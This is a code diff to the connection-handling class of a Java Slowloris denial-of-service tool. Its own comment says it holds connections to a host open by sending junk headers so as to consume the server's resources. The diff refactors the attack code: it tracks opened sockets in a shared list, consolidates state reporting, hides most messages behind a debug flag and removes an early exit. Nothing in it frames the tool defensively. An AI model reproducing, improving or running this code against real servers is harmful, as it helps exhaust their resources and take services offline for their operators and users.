@@ -10,6 +10,7 @@ import java.net.InetAddress;
 import java.net.Socket;
 import java.net.SocketException;
 import java.net.UnknownHostException;
+import java.util.ArrayList;
 
 /**
  * Connection to a specified host and keeps the connection alive as long as possible by sending some junk headers to consume the Server resources 
@@ -30,6 +31,10 @@ public class Connection implements Runnable{
     private BufferedWriter writer;
     private final int UA;
     private final int CL; 
+
+    private static ArrayList<Socket> OPENED_SOCKETS = new ArrayList<Socket>();
+
+    private boolean isConn = false;
 
     private final SlowLoris slowloris;
 
@@ -59,8 +64,13 @@ public class Connection implements Runnable{
         try {
             socket = new Socket(InetAddress.getByName(hostname), port);
 
+            // add the socket to list of Opened sockets
+            update(socket);
+
             // Update the state to connected
             slowloris.update(UPDATE_TYPE.CONNECTED);
+
+            isConn = true;
 
             writer = new BufferedWriter(new OutputStreamWriter(
                     socket.getOutputStream(), "UTF-8")); // A writer used to output to the socket
@@ -78,44 +88,62 @@ public class Connection implements Runnable{
                 try {
                     Thread.sleep(interval);	// Forces this thread to wait, to make the connection last
                 } catch (InterruptedException e) {
-                    System.err.println("Thread can't sleep");
+                    if(SlowLoris.DEBUG)
+                        System.err.println("Thread can't sleep");
+                    break;
                 }
             }
 
             writer.close();
             socket.close();
-            slowloris.update(UPDATE_TYPE.CLOSED);
-            System.out.println("Thread finished");
+            if(SlowLoris.DEBUG)
+                System.out.println("Thread finished");
 
         } catch (UnknownHostException e) {
             // TODO Auto-generated catch block
             if(SlowLoris.DEBUG)
                 System.err.println("Hostname Could not be resolved, Please check the DNS");
-            slowloris.update(UPDATE_TYPE.CLOSED);
         } catch (ConnectException e) {
-            System.out.println("Connection error! Check that there is an HTTP server and the port is correct.");
-            slowloris.update(UPDATE_TYPE.CLOSED);
-            System.exit(0);
+            if(SlowLoris.DEBUG)
+                System.out.println("Connection error! Check that there is an HTTP server and the port is correct.");
         } catch (SocketException e) {
             if(SlowLoris.DEBUG)
-                System.out.print(e.getMessage());
-            slowloris.update(UPDATE_TYPE.CLOSED);
+                System.out.println(e.getMessage());
             try {
                 if(writer != null)
                     writer.close();
                 if(socket != null)
                     socket.close();
-                return;
             } catch (IOException e1) {
                 if(SlowLoris.DEBUG)
                     e1.printStackTrace();
             }
 
         } catch (Exception e) {
-            slowloris.update(UPDATE_TYPE.ERROR);
             if(SlowLoris.DEBUG)
                 e.printStackTrace();
         }
+
+        slowloris.update(isConn?UPDATE_TYPE.CLOSED:UPDATE_TYPE.ERROR);
+        return;
     }
+
+    public static synchronized void update(Socket socket) {
+        // TODO Auto-generated method stub
+        if(socket != null)
+            OPENED_SOCKETS.add(socket);
+        else{
+            for(Socket s:OPENED_SOCKETS){
+                try{
+                    s.close();
+                }catch(Exception e) {}
+            }
+            
+            OPENED_SOCKETS = null;
+        }
+
+    }
+
+
 
 }
